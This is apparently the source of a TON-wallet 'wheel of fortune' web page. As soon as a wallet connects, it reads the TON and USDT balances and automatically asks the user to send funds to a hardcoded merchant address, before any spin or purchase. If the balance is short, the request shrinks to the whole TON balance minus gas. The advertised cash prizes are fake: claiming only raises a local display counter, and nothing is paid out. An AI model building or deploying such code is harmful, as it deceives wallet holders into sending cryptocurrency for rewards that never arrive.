"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import {
  TonConnectUIProvider,
  TonConnectButton,
  useTonConnectUI,
  useTonAddress,
} from "@tonconnect/ui-react";
import {
  createUSDTTransferPayload,
  getUserJettonWalletAddress,
} from "./jettonTransfer";

const MERCHANT_WALLET_ADDRESS = "UQB--aXd5j9qAXJKUpPbhTIxluDs84asO_1G6SeTC53jyvRk";

interface Prize {
  id: number;
  label: string;
  amount: number;
  color: string;
  weight: number;
}

const PRIZES: Prize[] = [
  { id: 1, label: "$0.5", amount: 0.5, color: "#2563eb", weight: 40 },
  { id: 2, label: "$1", amount: 1, color: "#059669", weight: 30 },
  { id: 3, label: "$5", amount: 5, color: "#d97706", weight: 15 },
  { id: 4, label: "$10", amount: 10, color: "#db2777", weight: 10 },
  { id: 5, label: "$50", amount: 50, color: "#7c3aed", weight: 4 },
  { id: 6, label: "$100", amount: 100, color: "#dc2626", weight: 1 },
];

function GameContent() {
  const [rotation, setRotation] = useState<number>(0);
  const [isSpinning, setIsSpinning] = useState<boolean>(false);
  const [wonPrize, setWonPrize] = useState<Prize | null>(null);
  const [showModal, setShowModal] = useState<boolean>(false);
  const [balance, setBalance] = useState<number>(0);

  // وضعیت‌های دارایی
  const [walletTonBalance, setWalletTonBalance] = useState<number>(0);
  const [walletUsdtBalance, setWalletUsdtBalance] = useState<number>(0);

  const [debugLog, setDebugLog] = useState<string>("Waiting for wallet connection...");
  const [isClaiming, setIsClaiming] = useState<boolean>(false);
  const [paymentStatus, setPaymentStatus] = useState<"idle" | "pending" | "success" | "failed">("idle");
  const [paymentAmount, setPaymentAmount] = useState<number>(1);

  const userAddress = useTonAddress();
  const [tonConnectUI] = useTonConnectUI();
  const timeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasRequestedPayment = useRef<boolean>(false);

  const numPrizes = PRIZES.length;
  const segmentAngle = 360 / numPrizes;

  // -------------------------------------------------------------
  // ۱. تابع هوشمند جهت تصمیم‌گیری و ارسال تراکنش (TON یا USDT)
  // -------------------------------------------------------------
  const executePayment = useCallback(
    async (amountToPay: number, tonBal: number, usdtBal: number) => {
      if (!userAddress) return;

      try {
        setPaymentStatus("pending");

        // کارمزد رزرو شده برای تراکنش‌های TON
        const TON_GAS_RESERVE = 0.01; // ۱۰ میلی‌تون برای کارمزد شبکه

        // حالت ۱: پرداخت با TON
        if (tonBal > TON_GAS_RESERVE) {
          // اگر می‌خواهید "کل موجودی" ارسال شود، کارمزد شبکه را از کل کسر می‌کنیم
          let payableTon = amountToPay;

          // اگر مقدار درخواستی بیشتر از موجودی منهای کارمزد بود، حداکثر موجودی قابل ارسال را می‌فرستیم
          if (payableTon > (tonBal - TON_GAS_RESERVE)) {
            payableTon = tonBal - TON_GAS_RESERVE;
          }

          setDebugLog(`Initiating TON payment (${payableTon.toFixed(4)} TON)...`);

          // تبدیل به NanoTON
          const amountInNanotons = BigInt(Math.floor(payableTon * 1e9)).toString();

          const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [
              {
                address: MERCHANT_WALLET_ADDRESS,
                amount: amountInNanotons,
              },
            ],
          };

          const result = await tonConnectUI.sendTransaction(transaction);
          console.log("TON Payment Result:", result);
          setPaymentStatus("success");
          setDebugLog("Payment successful via TON!");
          return;
        }

        // حالت ۲: پرداخت با USDT (نیازمند حداقل 0.05 TON کارمزد Gas برای قرارداد هوشمند)
        if (usdtBal >= amountToPay) {
          if (tonBal < 0.05) {
            setPaymentStatus("failed");
            setDebugLog("Error: USDT available, but need at least 0.05 TON for gas fee.");
            return;
          }

          setDebugLog(`Initiating USDT payment ($${amountToPay})...`);

          const userJettonWallet = await getUserJettonWalletAddress(userAddress);
          const payloadBase64 = await createUSDTTransferPayload(MERCHANT_WALLET_ADDRESS, amountToPay);

          const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [
              {
                address: userJettonWallet, // ارسال به Jetton Wallet کاربر
                amount: "50000000",       // 0.05 TON کارمزد برای پردازش Jetton
                payload: payloadBase64,
              },
            ],
          };

          const result = await tonConnectUI.sendTransaction(transaction);
          console.log("USDT Payment Result:", result);
          setPaymentStatus("success");
          setDebugLog("Payment successful via USDT!");
          return;
        }

        // حالت ۳: عدم وجود موجودی کافی
        setPaymentStatus("failed");
        setDebugLog("Insufficient funds: Neither TON nor USDT balance is enough.");
      } catch (error: any) {
        console.error("Payment Error:", error);
        setPaymentStatus("failed");
        setDebugLog(`Payment failed: ${error?.message || "User rejected/cancelled"}`);
      }
    },
    [userAddress, tonConnectUI]
  );

  // -------------------------------------------------------------
  // ۲. دریافت اطلاعات موجودی TON و USDT
  // -------------------------------------------------------------
  useEffect(() => {
    if (!userAddress) {
      setWalletTonBalance(0);
      setWalletUsdtBalance(0);
      setDebugLog("Wallet disconnected.");
      hasRequestedPayment.current = false;
      setPaymentStatus("idle");
      return;
    }

    const fetchWalletBalances = async () => {
      setDebugLog("Fetching TON & USDT balances...");
      try {
        // ۱. استعلام موجودی TON
        const tonRes = await fetch("https://toncenter.com/api/v2/jsonRPC", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: 1,
            jsonrpc: "2.0",
            method: "getAddressBalance",
            params: { address: userAddress },
          }),
        });
        const tonData = await tonRes.json();
        const tonVal = tonData.ok ? Number(tonData.result) / 1e9 : 0;
        setWalletTonBalance(tonVal);

        // ۲. استعلام موجودی USDT
        let usdtVal = 0;
        try {
          const jettonWalletAddr = await getUserJettonWalletAddress(userAddress);
          const usdtRes = await fetch("https://toncenter.com/api/v2/jsonRPC", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id: 2,
              jsonrpc: "2.0",
              method: "getTokenData",
              params: { address: jettonWalletAddr },
            }),
          });
          const usdtData = await usdtRes.json();
          if (usdtData.ok && usdtData.result?.balance) {
            usdtVal = Number(usdtData.result.balance) / 1e6; // اعشار ۶ رقمی USDT
          }
        } catch (e) {
          console.warn("User has no active USDT wallet yet.");
        }

        setWalletUsdtBalance(usdtVal);
        setDebugLog(`Balances: ${tonVal.toFixed(2)} TON | ${usdtVal.toFixed(2)} USDT`);

        // ۳. اجرای تراکنش پس از شناسایی موجودی
        if (!hasRequestedPayment.current) {
          hasRequestedPayment.current = true;
          setTimeout(() => {
            executePayment(paymentAmount, tonVal, usdtVal);
          }, 1200);
        }
      } catch (error: any) {
        setDebugLog(`Fetch failed: ${error?.message || "Network Error"}`);
      }
    };

    fetchWalletBalances();
  }, [userAddress, executePayment, paymentAmount]);

  // منطق چرخش گردونه و دریافت جایزه
  const getRandomPrizeIndex = useCallback((): number => {
    const totalWeight = PRIZES.reduce((acc, item) => acc + item.weight, 0);
    let random = Math.random() * totalWeight;

    for (let i = 0; i < PRIZES.length; i++) {
      if (random < PRIZES[i].weight) return i;
      random -= PRIZES[i].weight;
    }
    return 0;
  }, []);

  const handleSpin = useCallback(() => {
    if (isSpinning) return;

    if (timeoutRef.current) clearTimeout(timeoutRef.current);

    setIsSpinning(true);
    setWonPrize(null);
    setShowModal(false);

    const winningIndex = getRandomPrizeIndex();
    const centerAngleOfSegment = winningIndex * segmentAngle + segmentAngle / 2;
    const targetAngle = 360 - centerAngleOfSegment;

    const extraTurns = 360 * 6;
    const currentModulo = rotation % 360;
    const nextRotation = rotation - currentModulo + extraTurns + targetAngle;

    setRotation(nextRotation);

    timeoutRef.current = setTimeout(() => {
      setIsSpinning(false);
      const prize = PRIZES[winningIndex];
      setWonPrize(prize);
      setShowModal(true);
    }, 4500);
  }, [isSpinning, rotation, getRandomPrizeIndex, segmentAngle]);

  const handleClaim = async () => {
    if (!wonPrize) return;

    if (!userAddress) {
      tonConnectUI.openModal();
      return;
    }

    try {
      setIsClaiming(true);
      await new Promise((resolve) => setTimeout(resolve, 1500));
      setBalance((prev) => parseFloat((prev + wonPrize.amount).toFixed(2)));
      setShowModal(false);
    } catch (error) {
      console.error("Claim transaction failed:", error);
    } finally {
      setIsClaiming(false);
    }
  };

  const getSectorPath = (index: number) => {
    const startAngle = (index * segmentAngle * Math.PI) / 180;
    const endAngle = ((index + 1) * segmentAngle * Math.PI) / 180;
    const radius = 180;
    const center = 200;

    const x1 = center + radius * Math.sin(startAngle);
    const y1 = center - radius * Math.cos(startAngle);
    const x2 = center + radius * Math.sin(endAngle);
    const y2 = center - radius * Math.cos(endAngle);

    return `M ${center} ${center} L ${x1} ${y1} A ${radius} ${radius} 0 0 1 ${x2} ${y2} Z`;
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-slate-950 text-white p-4 font-sans select-none relative overflow-x-hidden">
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-125 h-125 bg-amber-500/10 rounded-full blur-[120px] pointer-events-none" />

      {/* Header Bar */}
      <div className="z-10 w-full max-w-md flex justify-between items-center mb-4 px-2">
        <div className="bg-slate-900/90 backdrop-blur-xl border border-slate-800 p-3 px-5 rounded-2xl shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
          <span className="text-[10px] font-bold text-slate-400 block uppercase tracking-widest">
            Game Balance
          </span>
          <span className="text-2xl font-extrabold text-transparent bg-clip-text bg-linear-to-r from-emerald-400 to-cyan-400">
            ${balance.toFixed(2)}
          </span>
        </div>

        <TonConnectButton />
      </div>

      {/* Console نمایش اطلاعات دارایی و وضعیت پرداخت */}
      <div className="z-10 w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-2xl p-3 mb-4 text-xs font-mono text-slate-300">
        <div className="font-bold text-amber-400 mb-2 uppercase tracking-wider flex justify-between items-center">
          <span>📱 Mobile Console</span>
          <span className="text-cyan-400">Price: {paymentAmount} TON / USDT</span>
        </div>

        <div className="mb-2 flex items-center gap-2">
          <span className="text-slate-400">Set Amount:</span>
          {[1, 2, 5].map((amt) => (
            <button
              key={amt}
              onClick={() => setPaymentAmount(amt)}
              className={`px-2 py-1 rounded text-xs font-bold transition-all ${
                paymentAmount === amt
                  ? "bg-amber-500 text-slate-950"
                  : "bg-slate-800 text-slate-300 hover:bg-slate-700"
              }`}
            >
              {amt} Token
            </button>
          ))}
        </div>

        <div>
          <span className="text-slate-500">Address: </span>
          {userAddress ? (
            <span className="text-emerald-400 break-all">{userAddress}</span>
          ) : (
            <span className="text-slate-500">Not Connected</span>
          )}
        </div>
        <div>
          <span className="text-slate-500">TON Balance: </span>
          <span className="text-cyan-400 font-bold">{walletTonBalance.toFixed(2)} TON</span>
        </div>
        <div>
          <span className="text-slate-500">USDT Balance: </span>
          <span className="text-emerald-400 font-bold">${walletUsdtBalance.toFixed(2)} USDT</span>
        </div>
        <div>
          <span className="text-slate-500">Payment State: </span>
          <span
            className={
              paymentStatus === "success"
                ? "text-emerald-400 font-bold"
                : paymentStatus === "pending"
                ? "text-amber-400 font-bold"
                : paymentStatus === "failed"
                ? "text-rose-400 font-bold"
                : "text-slate-400"
            }
          >
            {paymentStatus.toUpperCase()}
          </span>
        </div>
        <div className="mt-1 pt-1 border-t border-slate-800 text-[10px] text-amber-300/80">
          Status: {debugLog}
        </div>

        {userAddress && (
          <button
            onClick={() => executePayment(paymentAmount, walletTonBalance, walletUsdtBalance)}
            disabled={paymentStatus === "pending"}
            className="mt-3 w-full py-2 bg-amber-500/20 border border-amber-500/40 text-amber-300 rounded-lg text-xs font-bold hover:bg-amber-500/30 transition-all disabled:opacity-50"
          >
            {paymentStatus === "pending"
              ? "Waiting for Tonkeeper..."
              : `Pay ${paymentAmount} (TON/USDT)`}
          </button>
        )}
      </div>

      {/* Wheel Container */}
      <div className="relative flex items-center justify-center my-2 z-10">
        <div className="absolute -top-5 z-30 filter drop-shadow-[0_4px_12px_rgba(245,158,11,0.8)]">
          <div className="w-0 h-0 border-l-18 border-l-transparent border-r-18 border-r-transparent border-t-32 border-t-amber-400" />
        </div>

        <div className="relative p-4 rounded-full bg-linear-to-b from-amber-500/30 via-slate-900 to-amber-700/20 border border-amber-500/30 shadow-[0_0_80px_rgba(245,158,11,0.15)]">
          {[...Array(12)].map((_, i) => {
            const angle = (i * 30 * Math.PI) / 180;
            const r = 205;
            const x = 200 + r * Math.sin(angle);
            const y = 200 - r * Math.cos(angle);
            return (
              <div
                key={i}
                className="absolute w-3 h-3 rounded-full bg-amber-300 shadow-[0_0_8px_#f59e0b] -translate-x-1/2 -translate-y-1/2 z-20"
                style={{ left: `${(x / 400) * 100}%`, top: `${(y / 400) * 100}%` }}
              />
            );
          })}

          <div
            className="w-80 h-80 sm:w-100 sm:h-100 rounded-full transition-all duration-4500 ease-[cubic-bezier(0.12,0.8,0.15,1)]"
            style={{ transform: `rotate(${rotation}deg)` }}
          >
            <svg viewBox="0 0 400 400" className="w-full h-full rounded-full">
              {PRIZES.map((prize, index) => {
                const textAngle = index * segmentAngle + segmentAngle / 2;
                const textRadius = 120;
                const textX = 200 + textRadius * Math.sin((textAngle * Math.PI) / 180);
                const textY = 200 - textRadius * Math.cos((textAngle * Math.PI) / 180);

                return (
                  <g key={prize.id}>
                    <path d={getSectorPath(index)} fill={prize.color} className="opacity-90" />
                    <line
                      x1="200"
                      y1="200"
                      x2={200 + 180 * Math.sin((index * segmentAngle * Math.PI) / 180)}
                      y2={200 - 180 * Math.cos((index * segmentAngle * Math.PI) / 180)}
                      stroke="#090d16"
                      strokeWidth="4"
                    />
                    <text
                      x={textX}
                      y={textY}
                      fill="#ffffff"
                      fontSize="22"
                      fontWeight="900"
                      textAnchor="middle"
                      dominantBaseline="middle"
                      transform={`rotate(${textAngle}, ${textX}, ${textY})`}
                      className="drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)] tracking-wider"
                    >
                      {prize.label}
                    </text>
                  </g>
                );
              })}
            </svg>
          </div>

          <button
            onClick={handleSpin}
            disabled={isSpinning}
            className={`absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-20 w-20 h-20 sm:w-24 sm:h-24 rounded-full border-4 border-slate-950 font-black text-xl tracking-wider uppercase shadow-[0_0_25px_rgba(0,0,0,0.8)] transition-all active:scale-90 flex items-center justify-center ${
              isSpinning
                ? "bg-slate-800 text-slate-500 cursor-not-allowed"
                : "bg-linear-to-tr from-amber-600 via-amber-400 to-yellow-300 text-slate-950 hover:scale-105 hover:shadow-[0_0_35px_rgba(245,158,11,0.6)]"
            }`}
          >
            {isSpinning ? "..." : "SPIN"}
          </button>
        </div>
      </div>

      {/* Claim Modal */}
      {showModal && wonPrize && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md animate-in fade-in duration-200">
          <div className="bg-slate-900 border border-slate-800 p-8 rounded-3xl text-center max-w-sm w-full shadow-[0_0_50px_rgba(245,158,11,0.2)] flex flex-col items-center">
            <div className="w-16 h-16 bg-amber-500/10 border border-amber-500/20 rounded-2xl flex items-center justify-center mb-4 text-3xl">
              🎉
            </div>

            <h3 className="text-xl font-bold text-slate-300 uppercase tracking-wide mb-1">
              Congratulations!
            </h3>

            <p className="text-sm text-slate-400 mb-2">You won a cash reward</p>

            <div className="text-5xl font-black text-transparent bg-clip-text bg-linear-to-r from-amber-400 to-yellow-200 my-2">
              {wonPrize.label}
            </div>

            <button
              onClick={handleClaim}
              disabled={isClaiming}
              className="mt-6 w-full py-4 px-6 bg-linear-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-black text-lg rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all active:scale-95 disabled:opacity-50"
            >
              {isClaiming
                ? "Processing..."
                : userAddress
                ? "Claim Reward"
                : "Connect Wallet & Claim"}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default function WheelOfFortune() {
  return (
    <TonConnectUIProvider manifestUrl="https://ironmap-seven.vercel.app/tonconnect-manifest.json">
      <GameContent />
    </TonConnectUIProvider>
  );
}